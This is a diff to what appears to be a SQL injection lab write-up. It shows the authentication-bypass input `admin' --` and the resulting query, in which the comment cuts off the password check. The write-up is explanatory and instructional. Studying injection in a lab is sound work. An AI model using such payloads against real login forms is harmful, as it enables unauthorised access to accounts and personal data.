@@ -22,4 +22,15 @@ $result = $conn -> query($sql);
 Considering that we know the code, it is really easy to exploit this vulnerability:
 
 `username: admin' -- `
-`password: <anythin> `
+
+
+`password: <anything> `
+
+This approach works, because the sql statement that will be queried to the database will be partionally connected and, with that, we can enter the system:
+
+```sql
+    SELECT id, name, eid, salary, birth, ssn, address, email,
+               nickname, Password
+        FROM credential
+        WHERE name= ’admin’ -- and Password=’<anything>";
+```
